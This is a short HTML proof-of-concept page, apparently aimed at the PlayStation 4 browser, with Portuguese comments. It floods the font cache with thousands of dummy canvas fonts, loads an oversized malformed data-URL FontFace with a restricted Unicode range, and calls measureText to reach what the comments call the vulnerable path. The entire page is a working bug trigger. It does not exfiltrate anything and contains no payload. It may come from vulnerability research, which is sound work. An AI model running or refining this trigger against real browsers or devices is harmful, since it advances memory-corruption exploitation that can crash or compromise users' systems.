<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 PoC - Main Thread (Synchronous)</title>
</head>
<body>
<h2>Teste PoC: Main Thread (Síncrono)</h2>
<p id="status">Executando teste...</p>
<script>
try {
    const statusEl = document.getElementById("status");

    // 1. Estressar o cache com milhares de entradas de fontes distintas
    statusEl.textContent = "Estressando o cache de fontes...";
    const dummies = [];
    for (let i = 0; i < 3500; i++) {
        const canvas = document.createElement('canvas');
        canvas.width = 1;
        canvas.height = 1;
        const dummy = canvas.getContext('2d');
        dummy.font = '10px "dummy' + i + '"';
        dummies.push(dummy);
    }

    // 2. Criar fonte síncrona via data: URL (simulando o comportamento do worker)
    statusEl.textContent = "Carregando fonte customizada...";
    const fontData = 'A'.repeat(1100000);
    const pendingFontURL = 'url("data:font/ttf;base64,' + fontData + '")';

    for (let attempt = 0; attempt < 2; attempt++) {
        const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
        const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
        
        document.fonts.add(metricsDonor);
        document.fonts.add(measured);

        const canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        const context = canvas.getContext('2d');
        
        context.font = '10px metricsDonor' + attempt + ', measured' + attempt;

        // 3. Disparar a medição que aciona o caminho vulnerável
        statusEl.textContent = "Medindo texto (Tentativa " + (attempt + 1) + ")...";
        context.measureText('\u13A0\u13A2\u13A4');
    }

    statusEl.textContent = "Teste concluído sem travamento imediato!";
} catch (e) {
    document.getElementById("status").textContent = "Erro capturado: " + e.message;
}
</script>
</body>
</html>
